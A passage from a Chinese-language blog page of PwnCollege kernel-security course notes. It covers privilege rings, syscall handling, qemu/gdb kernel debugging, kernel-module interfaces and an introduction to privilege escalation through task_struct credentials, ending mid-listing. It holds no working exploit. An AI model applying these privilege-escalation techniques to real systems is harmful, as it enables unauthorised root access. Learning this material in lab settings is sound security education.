

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/touxiang.png">
  <link rel="icon" href="../../../../img/touxiang.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="0P1N">
  <meta name="keywords" content="">
  
    <meta name="description" content="PwnCollege - SystemSecurity - Kernel Security内核是操作系统的核心组件，是软件和硬件之间的桥梁。 内核运行在操作系统的最底层，其访问权限非常高，就像是冒充系统本身，甚至超越了root用户的最高权限。 内核安全至关重要，因为此级别的漏洞使攻击者可以像系统一样行事。 漏洞可能会导致未经授权的数据访问、系统崩溃或 rootkit 静默安装等情况。 Lectur">
<meta property="og:type" content="article">
<meta property="og:title" content="PwnCollege - SystemSecurity - KernelSecurity">
<meta property="og:url" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/index.html">
<meta property="og:site_name" content="0P1N">
<meta property="og:description" content="PwnCollege - SystemSecurity - Kernel Security内核是操作系统的核心组件，是软件和硬件之间的桥梁。 内核运行在操作系统的最底层，其访问权限非常高，就像是冒充系统本身，甚至超越了root用户的最高权限。 内核安全至关重要，因为此级别的漏洞使攻击者可以像系统一样行事。 漏洞可能会导致未经授权的数据访问、系统崩溃或 rootkit 静默安装等情况。 Lectur">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/1.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305205034.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305210302.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306192337.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306194632.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306202617.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306203800.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306204054.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309102937.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309124009.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240310165300.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302193623.png">
<meta property="og:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302194227.png">
<meta property="article:published_time" content="2024-03-27T04:00:00.000Z">
<meta property="article:modified_time" content="2024-03-27T15:00:50.100Z">
<meta property="article:author" content="0P1N">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="PwnCollege">
<meta property="article:tag" content="Linux kernel">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/1.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>PwnCollege - SystemSecurity - KernelSecurity - 0P1N</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"lkliki.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>Welcome To 0P1N&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="PwnCollege - SystemSecurity - KernelSecurity"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-27 12:00" pubdate>
          2024年3月27日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          58k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          485 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">PwnCollege - SystemSecurity - KernelSecurity</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="PwnCollege-SystemSecurity-Kernel-Security"><a href="#PwnCollege-SystemSecurity-Kernel-Security" class="headerlink" title="PwnCollege - SystemSecurity - Kernel Security"></a>PwnCollege - SystemSecurity - Kernel Security</h1><p>内核是操作系统的核心组件，是软件和硬件之间的桥梁。 内核运行在操作系统的最底层，其访问权限非常高，就像是冒充系统本身，甚至超越了root用户的最高权限。 内核安全至关重要，因为此级别的漏洞使攻击者可以像系统一样行事。 漏洞可能会导致未经授权的数据访问、系统崩溃或 rootkit 静默安装等情况。</p>
<h2 id="Lecture-and-Reading"><a href="#Lecture-and-Reading" class="headerlink" title="Lecture and Reading"></a>Lecture and Reading</h2><h3 id="Introductiom"><a href="#Introductiom" class="headerlink" title="Introductiom"></a>Introductiom</h3><p>仅限内核使用的资源的例子：</p>
<ul>
<li><code>hlt</code>指令,使CPU暂停</li>
<li><code>in</code>和<code>out</code>指令，使CPU和硬件外设交互</li>
<li><code>cr3</code>寄存器，该寄存器是对页表的引用，用于将进程的虚拟内存地址转换成ram中的物理地址，可在内核模式下使用<code>mov</code>指令访问。</li>
<li><code>MSR_LSTAR</code>寄存器，定义了syscall后跳转到的地址，可使用<code>wrmsr</code>和<code>rdmsr</code>指令访问。</li>
</ul>
<p>就像操作系统追踪用户的UID一样，CPU追踪当前的特权级别来控制对资源的访问权。特权级别使用环(rings)来表示。</p>
<ul>
<li>Ring3：用户空间，限制非常严格</li>
<li>Ring2&amp;1：通常不使用，部分设备驱动运行在该级别</li>
<li>Ring0:内核空间，无限制，<code>supervisor mode</code></li>
</ul>
<p>随着虚拟机的兴起，Supervisor mode特权开始引发一系列问题。虚拟机的”客户”内核不应该无限制地访问宿主机物理硬件。</p>
<ul>
<li>2000年初虚拟机刚出现时的解决方案：强制虚拟机内核运行在Ring1，这导致需要复杂且昂贵的软件仿真方法来模拟Ring0的一些功能。</li>
<li>现代的解决方案：发明了<code>Hypervisor Mode</code>，即客户机内核运行在Ring0，但是其敏感的Ring0特权动作会被虚拟机管理程序拦截并在宿主操作系统中被处理。</li>
</ul>
<p>根据内核与驱动程序和用户程序交互方式的不同，存在不同的操作系统模型</p>
<ul>
<li>宏内核(monolithic kernel):有一个单一的内核二进制文件来处理所有操作系统级别的任务。驱动作为模块加载到内核中，一起运行在ring0权限。典型的宏内核操作系统有：Linux、FreeBSD。</li>
<li>微内核(microk kernel)：只有一个具有最基础的硬件和进程交互功能的微型内核二进制文件运行在Ring0层，驱动程序等其它所有程序运行在特权较低的环中。当其它程序需要进行硬件访问等Ring0操作时，需要请求内核。微内核组件和组件、组件和内核间通信成本高，运行效率低，安全性高，常用于对安全性要求较高的操作系统中，如：Minux、seL4。</li>
<li>混合内核(hybird kernel)：同时具有宏内核和微内核的特征。混合内核的操作系统有：Windows(NT)、MacOS。MacOS在FreeBSD的基础上增加了一大堆苹果拓展，有一个整体内核，但拓展是微内核的特征。Windows中ntdll等是微内核组件，驱动和内核等都在ring0运行。</li>
</ul>
<p>x86&#x2F;64架构下的Rings间切换</p>
<p>1.boot阶段，在Ring0层，内核设置MSR_LSTAR寄存器指向名为<code>entry_SYSCALL</code>(<code>entry_SYSCALL_64</code>)的系统调用处理程序。</p>
<p>2.当用户空间进程想要和内核交互时，调用syscall:</p>
<ul>
<li>特权级别切换至Ring0</li>
<li>控制流跳转至<code>MSR_LSTAR</code>寄存器中的值</li>
<li>将返回地址保存到<code>rcx</code>寄存器</li>
<li>这个链接可以查看syscall的伪代码：<a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li>
</ul>
<p>3.当内核准备返回用户空间时，它调用对应的返回指令(比如<code>sysret</code>对应<code>syscall</code>)</p>
<ul>
<li>特权级别切换至Ring3</li>
<li>控制流跳转至<code>rcx</code>寄存器中的值</li>
</ul>
<p>x64虚拟内存中，用户空间和内核空间是相邻的，用户空间地址在低地址(最高以0x7f开头)，内核空间在高地址(通常以0xff开头)</p>
<p><code>cat /proc/$$/maps</code>查看当前shell的内存映射;<code>cat /proc/self/maps</code>查看cat进程的内存映射;<code>cat /proc/pid/maps</code>查看对应pid进程的内存映射</p>
<p>内核内存通常是不可见的，除了vsyscall映射的页面。vsyscall映射了一个大小为0x1000的用户空间可以访问的内核页面。这是一个过时的优化，用于使系统调用更快。</p>
<p>攻击内核的几个方向：</p>
<p>1.从网络：一般是可远程触发的漏洞利用，比如发送精心构造的恶意网络数据包到目标机器上造成代码执行。该类漏洞在现在非常少见。</p>
<p>2.从用户空间：利用在内核的syscall处理程序和ioctl处理程序中存在的漏洞，这也是在沙箱模块中逃离沙箱进程的一种非常常见的方式。很多沙箱漏洞利用都通过发送来自沙箱的攻击向量到出于性能原因开放的内核接口来完成攻击。</p>
<p>3.从外围设备：从外接设备如可编程USB等发起内核攻击。例如：将恶意u盘插入嵌入式设备并实现代码执行。<a target="_blank" rel="noopener" href="https://www.pjrc.com/teensy">https://www.pjrc.com/teensy</a></p>
<h3 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h3><p>内核开发和漏洞利用中的错误往往引起整个系统的崩溃，而不是简单的报错，因此最好在虚拟机中进行。</p>
<p>本课程的环境：<a target="_blank" rel="noopener" href="https://github.com/pwncollege/pwnkernel">https://github.com/pwncollege/pwnkernel</a></p>
<p>该环境使用qemu作为模拟器，根目录下有flag文件和预编译的示例内核模块，包含各种命令(指向busybox的符号链接)，并且将当前的<code>~</code>目录挂载到了仿真机的<code>/home/ctf</code>目录，以便在宿主机中编译exploits后在仿真环境中运行。</p>
<p>注意：由于仿真机中没有动态链接库，编译程序时需要设置为静态链接并不依赖标准库，否则程序无法运行，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> exit.s</span><br>.global _start<br>.intel_syntax noprefix<br>_start:<br>	xor eax,eax<br>	mov al,60<br>	syscall<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -static -nostdlib -o <span class="hljs-built_in">exit</span> exit.s</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">file <span class="hljs-built_in">exit</span></span><br>exit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=55c6c3c19b7e8ce3216dff2dde0153590362c50c, not stripped<br></code></pre></td></tr></table></figure>



<p>针对内核调试,仿真环境提供了：</p>
<ul>
<li>在编译时设置为保留符号的内核。</li>
<li>关闭了kernel ASLR</li>
<li>在launch.sh中，使用qemu仿真时添加了<code>-s</code>，表示在<code>1234</code>端口运行了<code>gdb server</code>。可以在宿主机中使用gdb连接到该端口来调试正在运行的linux内核。</li>
</ul>
<p>内核调试步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb ~/Desktop/pwn.college/pwnkernel/linux-5.4/vmlinux</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :1234</span><br>Remote debugging using :1234<br>default_idle () at arch/x86/kernel/process.c:581<br>......<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/i <span class="hljs-variable">$rip</span></span><br>=&gt; 0xffffffff81aac00e &lt;default_idle+30&gt;:        mov    ebp,DWORD PTR gs:[rip+0x7e56433b]        # 0x10350 &lt;cpu_number&gt;<br></code></pre></td></tr></table></figure>

<p>注意，开启调试后在gdb中按<code>c</code>，仿真环境的内核才会继续运行；内核调试中<code>ni</code>失效了，只能使用<code>si</code>进行单步调试。</p>
<p>要调试观察内核中用户态程序切换至内核态的过程，可以<code>objdump</code>反汇编查看程序的入口点，在入口点下断点后再在仿真环境中运行要调试的用户态程序。</p>
<p>这里在qemu仿真时用到的内核文件是<code>bzImage</code>,内核调试时载入gdb的内核文件是<code>vmlinux</code>，他们的区别可以参考<a href>ctf-wiki中常见内核文件介绍</a>。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<p>进一步的阅读：</p>
<ul>
<li>内核利用环境搭建:<a target="_blank" rel="noopener" href="https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup">https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup</a></li>
<li>内核调试:<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst">https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst</a></li>
<li>更丰富的内核实验环境:<a target="_blank" rel="noopener" href="https://github.com/cirosantilli/linux-kernel-module-cheat">https://github.com/cirosantilli/linux-kernel-module-cheat</a></li>
</ul>
<h3 id="kernel-Modules"><a href="#kernel-Modules" class="headerlink" title="kernel Modules"></a>kernel Modules</h3><p><strong>内核模块是什么</strong></p>
<p>就像用户态程序装载库一样，内核模块加载到内核中以提供功能。</p>
<ul>
<li>内核模块是ELF文件(.ko而不是.so)</li>
<li>内核模块装载到内核空间的地址</li>
<li>内核模块中的代码和内核一样运行在ring0特权</li>
</ul>
<p>内核模块用于实现<code>设备驱动</code>(如显卡驱动)、<code>文件系统</code>、<code>网络功能</code>（如部分防火墙）等。</p>
<p><strong>内核模块的交互接口</strong></p>
<p>1.系统调用。历史上，内核模块通过修改内核的系统调用表，注册新的系统调用来和用户态交互。现代内核非常明确地不支持这一方式。该方式经常被<code>rootkits</code>用来隐藏系统上的恶意软件。</p>
<p>2.中断。内核模块能够通过<code>LIDT</code>和<code>LGDT</code>指令注册中断处理程序并且使其被类似<code>int 42</code>的指令触发。</p>
<p>有用的可<code>hook</code>单字节中断指令，可以创建内核模块，修改其中断处理函数后将单字节指令插入程序中以改变程序的执行流。</p>
<ul>
<li>int 3(0xcc):处理器执行到0xcc时，会陷入内核，执行int3的异常处理代码，给当前进程发送<code>SIGTRAP</code>信号，但是我们可以hook该中断号，使其执行其它异常处理程序。</li>
<li>int 1(0xf1):通常用于硬件调试，可以被hook。</li>
</ul>
<p>也可以hook无效操作码(如ud2指令)中断，通常该中断会引发<code>SIGKILL</code>信号。</p>
<ul>
<li>能够在软件中实现自定义指令。</li>
<li>该hook已经被用于安全改造：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=OhQacawMxoY">https://www.youtube.com/watch?v=OhQacawMxoY</a></li>
</ul>
<p>3.文件。通过文件和内核模块交互是最常见的方式。</p>
<p>内核模块可以在以下的位置注册设备文件，应用程序通过对这些文件的读写和控制（open、write、poll等），可以和内核模块交互。设备文件通过<code>mknod</code>系统调用创建。</p>
<ul>
<li><code>/dev</code>：存放大部分传统设备(块设备和字符设备)的设备结点文件(比如<code>/dev/dsp</code>存放音频设备)。如果设备文件的设备号有对应的驱动，那么访问设备文件时可以和其设备驱动交互。</li>
<li><code>/proc</code>：属于特殊的<code>虚拟文件系统</code>，主要与系统内核和进程相关，包括进程ID、进程状态、进程命令行、系统状态、内核参数和配置等。最初用于获取正在运行进程的信息，Linux将其拓展为了一个混乱的内核接口。</li>
<li><code>/sys</code>：属于特殊的<code>虚拟文件系统</code>，主要与设备、驱动程序和硬件相关，包括设备名称、设备状态、设备驱动程序、硬件配置等。</li>
</ul>
<p>几种与设备文件交互的方式</p>
<p>1.内核模块为设备文件注册<code>read()</code>处理程序和<code>write()</code>处理程序，用户态读写时内核态中调用对应的函数进行处理。该方式适用于处理流数据(比如视频和音频数据)的内核模块。</p>
<p>内核模块分别注册<code>device_read</code>和<code>device_write</code>为读取和写入设 备时调用的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">char</span> *buffer,<span class="hljs-type">size_t</span> length,<span class="hljs-type">loff_t</span> *offset)</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> *off)</span><br></code></pre></td></tr></table></figure>

<p>用户态读写设备文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/pwn-college&quot;</span>,<span class="hljs-number">0</span>);<br>read(fd,buffer,<span class="hljs-number">128</span>);<br></code></pre></td></tr></table></figure>

<p>2.<code>ioctl()</code>系统调用(全称Input&#x2F;Output Control)。相比read和write，ioctl提供了更灵活的接口，也很危险，很多漏洞都来自ioctl。该方式适用于非流数据的设置和检索,比如网络摄像头分辨率设置。</p>
<p>内核态注册ioctl处理函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br></code></pre></td></tr></table></figure>

<p>用户态调用ioctl进行交互: </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/pwn-college&quot;</span>,<span class="hljs-number">0</span>)<br>ioctl(fd,COMMAND_CODE,&amp;custom_data_structure);<br></code></pre></td></tr></table></figure>

<p> <strong>用户态与内核交互时，内核模块做了什么</strong></p>
<p>理论上，宏内核中内核模块就相当于内核，它可以做任何事情，但是通常来说，内核会：</p>
<p>1.从用户空间读取数据(使用<code>copy_from_user</code>)</p>
<p>2.做一些事情来完成其功能(比如读写文件、和硬件交互等)</p>
<p>3.向用户空间写数据(使用<code>copy_to_user</code>)</p>
<p>4.返回用户空间</p>
<p><strong>构建和装载内核模块</strong></p>
<p>在本课程环境的<code>src</code>目录中，包含了示例内核模块。在环境中编写并编译自己的内核模块步骤如下：</p>
<ul>
<li>将内核模块源码(.c)放在<code>src</code>目录下</li>
<li>在<code>src</code>目录的<code>Makefile</code>文件的<code>obj-m</code>项后添加模块名.o</li>
<li>运行<code>build.sh</code></li>
</ul>
<p>内核模块(.ko文件)实际上是通过<code>init_module</code>系统调用装载的，但是通常我们使用<code>insmod</code>命令。</p>
<p>示例内核模块目录介绍，更详细可以阅读其源码</p>
<ul>
<li>hello_log:最简单的内核模块</li>
<li>hello_dev_char:在<code>/dev</code>目录下注册字符设备文件</li>
<li>hello_ioctl:在<code>/dev</code>目录下注册使用ioctl接口的字符设备文件</li>
<li>hello_proc_char:在<code>/proc</code>目录下注册字符设备文件</li>
<li>make_root: 在<code>/proc</code>目录下注册使用存在后门的ioctl接口的字符设备文件</li>
</ul>
<p>内核模块相关命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsmod  #列出当前内核中的模块<br>insmod #装载内核模块<br>rmmod  #删除内核模块<br>mknod  #创建设备结点文件<br></code></pre></td></tr></table></figure>



<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>复习：内核态和用户态的内存复制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">copy_to_user(userspace_address,kernel_address,length);<br>copy_from_user(kernel_address,userspace_address,length);<br></code></pre></td></tr></table></figure>

<p>内核的内存一定不能被损坏，否则可能导致以下后果：</p>
<ul>
<li>系统崩溃</li>
<li>系统阻塞</li>
<li>进程权限非法提升</li>
<li>和其它进程的交互</li>
</ul>
<p>用户态的数据应该被小心处理，确保只被<code>copy_to_user</code>和<code>copy_from_user</code>访问。</p>
<p><strong>经典内核漏洞利用 - 进程权限提升</strong></p>
<p>内核会通过<code>task_struct</code>结构体跟踪正在运行的进程的权限，每个进程都有一个<code>task_struct</code>。</p>
<p><code>task_struct</code>在内核源码中位于<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/sched.h"><code>include/linux/sched.h</code></a>。源码很长，以下源码在视频中缩略版的基础上根据最新版<code>v6.8-rc7</code>源码增加了<code>ptracer_cred</code>这一项。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> state;<br>    <span class="hljs-type">void</span> *<span class="hljs-built_in">stack</span>;<br>    <span class="hljs-type">atomic_t</span> usage;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">int</span> prio;<br>    <span class="hljs-type">int</span> static_prio;<br>    <span class="hljs-type">int</span> normal_prio;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rt_priority;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_info</span> <span class="hljs-title">sched_info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tasks</span>;</span><br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">pid_t</span> tgid;<br>    <br>  	<span class="hljs-comment">/* Process credentials: */</span><br><br>	<span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>		*<span class="hljs-title">ptracer_cred</span>;</span><br><br>	<span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span 